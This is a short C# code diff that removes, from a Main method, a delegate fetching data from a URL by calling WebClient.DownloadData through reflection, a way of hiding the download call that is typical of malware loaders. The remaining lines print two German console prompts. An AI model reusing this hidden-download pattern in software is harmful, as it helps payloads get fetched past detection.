@@ -1,20 +1,5 @@
 	private static void Main(string[] args)
 		{
-			Func<string, byte[]> func = delegate(string ul)
-			{
-				string b = "DownloadData";
-				foreach (MethodInfo methodInfo in typeof(WebClient).GetMethods())
-				{
-					if (methodInfo.Name == b)
-					{
-						WebClient obj2 = new WebClient();
-						return methodInfo.Invoke(obj2, new object[]
-						{
-							ul
-						}) as byte[];
-					}
-				}
-				return null;
 	
 			Console.WriteLine("bernd wo bist du hinn?");
 			Console.WriteLine("delay?(100/gut)");
